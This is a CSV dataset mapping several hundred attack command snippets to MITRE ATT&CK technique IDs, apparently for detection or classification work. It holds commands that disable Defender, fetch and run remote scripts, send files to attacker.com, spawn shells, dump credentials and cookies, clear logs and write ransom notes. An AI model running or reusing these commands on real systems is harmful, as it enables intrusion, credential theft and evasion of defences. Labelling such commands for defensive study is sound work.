command,mitre_id
"reg add ""HKLM\software\microsoft\windows defender\spynet"" /v ""SubmitSamplesConsent"" /t REG_DWORD /d ""0"" /f >NUL 2>nul",T1562
/proc/<PID>/environ,T1070
Start-Process .\BadPotato.exe notepad.exe,T1134
arj p /path/to/output-file,T1005
"echo ""# Required-Stop : "" >> /etc/init.d/T1543.002",T1543
"Get-Item -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run""",T1012
get-smbshare,T1135
DATETIME,T1124
"bash.exe -c ""{CMD}""",T1202
"UACBypass -noninteractive -command ""C:\windows\system32\cmd.exe"" -technique magic",T1548
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoClose /t REG_DWORD /d 1 /f",T1112
Get-LocAdm,T1069
%USERPROFILE%\Adobe\Driver\dwg\,T1036
ResponseOption,T1529
"var s=new java.net.Socket(host,port);",T1059
DCSync,T1003
expect /path/to/input-file,T1005
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose,T1018
0x7A,T1140
"echo cmd /c echo ""Shell code execution.""> $file_name:$ads_filename",T1564
clip.exe,T1115
.JPG,T1036
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f,T1112
"net localgroup ""adminstrator""",T1069
squirrel.exe --updateRollback={REMOTEURL},T1218
yelp man:/path/to/input-file,T1005
PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip},T1105
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'),T1003
/etc,T1546
"forfiles /p c:\windows\system32 /m notepad.exe /c ""{CMD}""",T1202
"New-Item -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security""",T1562
sleep 2,T1562
mkdir $PathToAtomicsFolder\T1560.001\victim-files,T1560
"Write-Host ""No EDR-Freeze executable (EDR-Freeze_*.exe) found in $scriptFolder"" -ForegroundColor Red",T1562
"copy ""$vbs_path"" %temp%\T1036.007_masquerading.png.vbs /Y",T1036
"if (""$uname"" -ne """") {",T1204
"Write-Host ""[Error] Invalid Inputs""",T1046
"dir ""c:\Program Files\"" >> %temp%\download",T1083
'FromBase'+0x40+'String',T1140
mega.nz,T1567
Remove-Variable xlBook,T1204
echo $dash_encoded | base64 -d | bash,T1140
CreateRemoteThreadEx,T1480
qwinsta.exe /server:$computer_name,T1033
/usr/bin/ksmd,T1036
CreateNoWindow,T1564
HKCU\Software\KasperskyLab,T1012
Start-Sleep -Seconds 3,T1562
Clear-DnsClientCache,T1562
man '-H/bin/sh #' man,T1059
icacls C:\Windows\System32\Magnify.exe /grant Administrators:F /t,T1546
SELECT * FROM MSAcpi_ThermalZoneTemperature,T1497
Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe',T1219
then,T1562
"$web_client.Credentials = New-Object System.Net.NetworkCredential('$username', '$password')",T1048
xattr -d com.apple.quarantine $app_path,T1553
GetDriveType,T1680
"$tr.Add(""[AccessDenied] $root"")",T1083
"Start-Process ""shell:AppsFolder\MicrosoftCorporationII.QuickAssist_8wekyb3d8bbwe!App""",T1219
$Create.TargetPath = $Target,T1547
"sc description W64Time ""Maintain date and time synch on all clients and services in the network""",T1543
"sudo sshuttle -r x --ssh-cmd '/bin/sh -c ""/bin/sh 0<&2 1>&2""' localhost",T1059
printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common,T1037
"if (!(Test-Path ""$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg"")) { reg.exe export ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager"" ""$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg"" /y }",T1547
wmiprvse.exe,T1047
git help config,T1548
"""AutodialDLL""=""c:\temp\foo.dll""",T1574
az storage blob download-batch --destination $containerFolderPath --source $row.ContainerName --connection-string $connectionString,T1530
vsls-agent.exe --agentExtensionPath {PATH_ABSOLUTE:.dll},T1218
"Set-Location ""$Env:windir\System32\Tasks""",T1218
c:\windows\temp,T1074
struct lua_State,T1059
powershell Get-CimInstance -Namespace root/securityCenter2 -classname antivirusproduct,T1518
attrib.exe,T1564
echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file,T1059
byebug --no-stop /path/to/script.rb,T1548
"powershell.exe -ep bypass -command ""set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()""",T1216
yum-versionlock,T1554
wdm,T1547
/etc/init/,T1037
if (-not (Test-Path -Path $storageAccountOutputPath)) {,T1530
"net group ""BUILTIN\Backup Operators"" /domain",T1069
"Write-Host ""STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON"" -fore green",T1003
find /usr/bin -perm -4000,T1548
"& ""$python_exe"" -c ""print('Triggering Hook via usercustomize...')""",T1546
"if [ ""$(uname)"" = 'FreeBSD' ]; then cmd=""netstat -Sp tcp""; else cmd=""netstat -ant""; fi;",T1016
CreateProcessAsUserA,T1134
sudo cat /dev/null > $system_log_path #truncating the file to zero bytes,T1070
"""select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];"" | cmd /c $sqlite3_path ""$cookie_db"" | out-file -filepath ""$output_file""",T1539
/etc/xdg/autostart,T1547
"echo ""1. Install TOR Browser to get access to our chat room - https://www.torproject.org/download/."" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
tcpdump -c 5 -nnni $interface,T1040
"echo ""$pwd_for_encrypted_file"" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo $encryption_alg -o $encrypted_file_path -c $input_file_path",T1486
"[ ""$(uname)"" = 'FreeBSD' ] && alias python3=python3.9",T1048
.dylib,T1129
exiftool -if '...' /etc/passwd,T1548
Presentationhost.exe {REMOTEURL},T1105
cscript %windir%\System32\manage-bde.wsf,T1216
then sed -i '$ a #art_test_1562_006_2' /etc/$rsyslog_config_file_name,T1562
"set-Content $rclone_config_path\rclone\rclone.conf ""[$remote_share] `n type = mega `n user = $mega_user_account `n pass = $mega_user_password""",T1567
"cmd /c start /b netsh advfirewall firewall add rule name=""SGAccessInboundRule"" dir=in protocol=udp action=allow localport=49683",T1562
.vmdk,T1680
shuf -e DATA -o /path/to/output-file,T1222
"cmd /c ""timeout $recording_time > NULL && psr.exe /stop""",T1113
.sys,T1543
needrestart -c /path/to/temp-file,T1548
Start-Process -Wait $file1 /quiet;,T1219
GetComputerNameW,T1106
nohup /path/to/command,T1059
CredEnumerateW,T1555
Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use,T1059
print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe},T1105
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_DWORD /v ""InputProvider"" /d ""1"" /f",T1547
fail2ban-client -c /path/to/temp-dir/ -v restart,T1059
GetUserDefaultLocaleName,T1614
"copy ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe"" C:\Users\Public\Downloads\MP.exe && chdir ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\"" && ""C:\Users\Public\Downloads\MP.exe"" -DownloadFile -url {REMOTEURL:.exe} -path C:\Users\Public\Downloads\evil.exe",T1105
"& ""$onedrive_path""",T1105
whoami.exe /all >> $output_path\$file,T1033
SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy,T1112
public long Luid;,T1562
"Set-LocalUser -Name $account -Description ""atr:$account;$originalDescription"".Substring(0,48) # Keep original name in description",T1098
"lua -e 'os.execute(""/bin/sh"")'",T1059
Program Files,T1485
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableScriptScanning"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",T1562
net user $user_account $new_user_password /add,T1531
ShowLocalGroupDetails,T1069
"netsh advfirewall firewall set rule group=""file and printer sharing"" new enable=Yes",T1562
"Copy-Item ""$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account"" -Destination ""PathToAtomicsFolder\..\ExternalPayloads""",T1555
Microsoft.IdentityServer.Servicehost.exe.config,T1556
LoadLibraryW,T1106
"New-ItemProperty -Path HKCU:\Environment -Name ""COR_PROFILER"" -PropertyType String -Value ""$clsid_guid"" -Force | Out-Null",T1574
lp /path/to/input-file -h attacker.com,T1105
[Win32.Wallpaper]::SetWallpaper($imgLocation),T1491
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce,T1012
sudo echo '' > $system_log_path,T1070
/Users/,T1554
sort -m /path/to/input-file,T1005
ex,T1548
ping -c 4 $ping_target,T1016
/Library/Application Support/com.apple.TCC/TCC.db,T1548
foreach ($ip in $subnetIPs) {,T1046
service syslogd stop,T1562
/dev/random,T1546
check_cups --extra-opts=@/path/to/input-file,T1005
PIS-DB,T1070
nltest /trusted_domains,T1482
posh,T1059
arp -v -f /path/to/input-file,T1005
regedit /E {PATH_ABSOLUTE}:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey,T1564
"schtasks /create /ru ""SYSTEM"" /tn ""update"" /tr ""cmd /c c:\windows\temp\update.bat"" /sc once /f /st",T1053
certutil -addstore my $pfx_path,T1553
Get-WMIObject Win32_Group,T1069
iphlpsvc,T1036
"reg add HKCU\SOFTWARE\NetWire /v ""Install Date"" /t REG_SZ /d ""2021-08-30 07:17:27"" /f",T1112
"Write-Host ""Failed to download or extract EDR-Freeze: $_"" -ForegroundColor Red",T1562
"schtasks.exe /Change /TN ""\Microsoft\Windows\SystemRestore\SR"" /disable",T1490
systemd,T1562
"Write-Host ""Your paste URL: $response""",T1567
echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/path/to/temp-file,T1059
makecab.exe $input_file $output_file,T1560
"""$vboxmanage_exe"" startvm ""$vm_name""",T1564
"Set-Content -Path ""$File_to_Encrypt_Location"" -Value ""populating this file with some text"" # Create the test.txt file again in case prereqs failed",T1486
"Write-Host -ForegroundColor Yellow ""You must store the password of the current user by running the prerequisite commands first""",T1098
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1,T1036
"net group ""domain admins"" /dom",T1069
fail2ban-client set x addaction x,T1059
aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file,T1105
screen -L -Logfile /path/to/output-file echo DATA,T1222
echo End of Silver Ticket attack,T1558
makecab /F {PATH:.ddf},T1036
ab -p /path/to/input-file http://attacker.com/,T1105
"curl -s -A ""Wget/1.9+cvs-stable (Red Hat modified)"" -m3 $domain",T1071
"echo 'BEGIN {system(""/bin/sh 1<&0"");exit()}' >/path/to/temp-file",T1059
"zipfldr.dll, ieframe.dll",T1218
less /path/to/input-file,T1005
TrustedHosts,T1021
sfind,T1083
show ip route,T1016
"New-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force",T1112
echo '# PROVIDE: art-test' >> $rc_service_path/$rc_service_file,T1543
devtunnel.exe host -p 8080,T1105
"try{$response = invoke-webrequest ""https://$base_name.blob.core.windows.net/$container_name/$blob_name"" -method ""GET""}",T1619
Wow64DisableWow64FsRedirection(),T1106
"su -l art -c ""echo 'echo \""Atomic Red Team was here... T1546.004\"" >> /home/art/art.txt' >> /home/art/.bash_logout; exit""",T1546
"reg add ""HKLM\Software\Microsoft\Windows Defender"" /v ""PUAProtection"" /t REG_DWORD /d ""0"" /f >NUL 2>nul",T1562
fail2ban-client set x unbanip 999.999.999.999,T1059
cmd.exe /c %APPDATA%\notepad.exe /B,T1036
"if sys.version_info.major == 3: import http.server as s, socketserver as ss",T1105
certutil.exe,T1105
"cmd.exe /c ""fsutil behavior set SymlinkEvaluation R2L:1""",T1569
mkdir %temp%\T1119_command_prompt_collection >nul 2>&1,T1119
rar,T1560
C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup,T1060
SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Print\\Printers,T1112
GdipSaveImageToStream,T1113
net group “domain admins” /domain,T1087
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\OutlookM,T1547
truncate -s +1 $file_to_pad #adds a byte to the file size,T1027
whoami/upn&whoami/fqdn&whoami/logonid&whoami/all,T1033
user32.dll.mui,T1070
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=group) $optional_args",T1069
/etc/passwd,T1556
"invoke-expression 'cmd /c start powershell -command { cmd /c ""$snaffler_path"" -a -o ""$output_path"" }; start-sleep 90; stop-process -name ""snaffler""'",T1135
"Invoke-WebRequest -OutFile $env:Temp\test10.lnk ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk""",T1204
secedit /configure /db $secedit_db,T1547
NtRaiseHardError,T1529
"reg query ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit""",T1012
"New-ItemProperty $ExcelRegPath ""Path"" -value ""notepad.ppam"" -propertyType string | Out-Null",T1137
"$which_python -c ""from zipfile import ZipFile; ZipFile('$path_to_output_file', mode='w').write('$path_to_input_file')""",T1560
LdrLoadDll(),T1027
WerFault.exe,T1003
new-item $key -Name $name -Force,T1112
var Channels = Java.type('java.nio.channels.Channels');,T1105
wmic.exe,T1047
schtasks /create /sc minute /mo 1 /tn QQMusic ^ /tr C:Users\%USERPROFILE%\Downloads\spread.exe /F,T1053
del AtomicTestT1105.js /Q >nul 2>&1,T1105
"echo ""WantedBy=timers.target"" >> $path_to_systemd_timer",T1053
qwerasdf,T1560
Set-ADUser -AllowReversiblePasswordEncryption $true,T1556
Get-Process > $env:TEMP\T1119_3.txt,T1119
msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE,T1218
%SYSTEMROOT%,T1574
"Write-Host ""App permission $permission not found in the Graph Resource API"" -ForegroundColor Red",T1098
VirtualAllocEx,T1055
nltest/dclist,T1018
copy $vsc_name\Windows\System32\config\SYSTEM $extract_path\VSC_SYSTEM_HIVE,T1003
copy '$local_file' '*:\',T1570
"echo -n ""* * * * * root /bin/bash -c '/bin/bash -c echo \""\""; echo \""hello from host! "" > $mount_point$cron_path/$cron_filename",T1611
"New-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name DefaultDomainName -Value contoso.com -Force",T1562
set comspec={PATH_ABSOLUTE:.exe} & cscript c:\windows\system32\manage-bde.wsf,T1216
jq -Rr . /path/to/input-file,T1005
Software\SimonTatham\Putty\Sessions,T1552
cut -d '' -f1 /path/to/input-file,T1005
HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated,T1012
"Write-Host -ForegroundColor Cyan ""Successfully changed the password to $new_password""",T1098
sc query sense,T1518
IF(!(Test-Path $registryPath)),T1546
"AccCheckConsole.exe -window ""Untitled - Notepad"" {PATH_ABSOLUTE:.dll}",T1218
reg save HKLM\security %temp%\security,T1003
zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #',T1059
Invoke-WebRequest,T1105
AppPatch,T1546
"odbcconf.exe /S /A &lbrace;REGSVR ""C:\Users\Public\file.dll""&rbrace;",T1218
msgcat -P /path/to/input-file,T1005
%APPDATA%\Microsoft\Windows\Recent,T1083
Capture,T1113
"$sheet.Cells.Item(9,1) = ""=FWRITELN(A5, `""winHttp.Open `""`""GET`""`"", url, False`"")""",T1204
ifconfig.me,T1016
"cscript ""$jscript"" > %tmp%\T1059.007.out.txt",T1059
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v MaxMpxCt /d 65535 /t REG_DWORD /f,T1569
"Set-ItemProperty -Path $RunKey -Name ""socks5_powershell"" -Value ""$reg_key_value""",T1547
"powershell.exe /c ""Get-Service | where-object {$_.DisplayName -like '*sysm*'}""",T1518
Credential = $cred,T1114
START MMC.EXE EVENTVWR.MSC,T1574
Write-Host $new,T1484
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\CLSID"" /ve /T REG_SZ /d ""{00000001-0000-0000-0000-0000FEEDACDC}"" /f",T1546
regsvr32s,T1218
curl -O $remote_url/art,T1005
system account set,T1531
Microsoft.Office.Interop,T1559
dump64.exe {PID} out.dmp,T1003
"wmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\ntlmusers.evtx /q:\""Event[System[(EventID=4776)]]""'",T1087
"rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}",T1218
echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}' >/path/to/temp-file,T1005
git --exec-path=. x,T1059
"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}",T1218
qawsed1q2w3e,T1140
Stop-Service -Name EventLog,T1562
more /path/to/input-file,T1005
su art,T1078
code tunnel,T1219
GetConsoleWindow,T1106
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Applications\laxhost.dll,T1027
"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fAllowToGetHelp /t REG_DWORD /d 1 /f",T1112
wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash,T1059
"echo ""# Short Description: Atomic Test for Systemd Service Creation"" >> /etc/init.d/T1543.002",T1543
sekurlsa::logonPasswords,T1003
msiexec /y {PATH_ABSOLUTE:.dll},T1218
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run,T1060
cp -R ~/Library/Mail/* ~/Library/Mail/copy,T1070
"C:\Windows\SysWow64\Register-CimProvider.exe -Path ""$dll_payload""",T1218
AppDomainManager,T1574
InterlockedExchange,T1106
“%AppData%\{Unique Identifier}\NEWERSSEMP”,T1074
NET USE * '$remote_path' /TRANSPORT:QUIC /SKIPCERTCHECK,T1570
sekurlsa::Minidump lsassdump.dmp,T1003
adplus.exe -c {PATH:.xml},T1127
ip -force -batch /path/to/input-file,T1005
unset ART,T1059
"IF EXIST ""%temp%\Windows_Defender_Verification.xml"" ( schtasks /delete /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Verification"" /f )",T1562
"echo ""3. Use this code - - to log into our chat."" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
chmod g+xs $file_to_setuid,T1548
sh.stderr.pipe(this);,T1059
"Compress-Archive -Path $foundFilePaths -DestinationPath ""$outputZip\data.zip""",T1005
runas,T1134
decryptteamviewer -consoleoutput -noninteractive,T1555
nltest.exe /dclist:$target_domain,T1018
key,T1140
"reg add ""hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam"" /v ""Driver"" /d ""$monitor_dll"" /t REG_SZ /f",T1547
$writer.flush(),T1573
/var/log/maillog,T1070
/data/runtime/cockpit/wd.fd,T1559
su -c whoami art,T1078
cipher.exe /w:C:,T1485
"New-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"" -Name COMPlus_ETWEnabled -Value 0 -PropertyType ""String"" -Force",T1562
"Write-Host ""32-bit Office""",T1137
rpm --eval '%(/bin/sh 1>&2)',T1059
New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null,T1137
"echo ""python3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\"""" | sudo tee -a /etc/rc.common",T1037
CreateProcess,T1546
-s,T1543
docker cp $CONTAINER_ID:input-file /path/to/temp-file,T1005
"System.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;",T1059
wt.exe {CMD},T1202
CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE},T1105
tcsh -c 'echo DATA >/path/to/output-file',T1222
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1,T1036
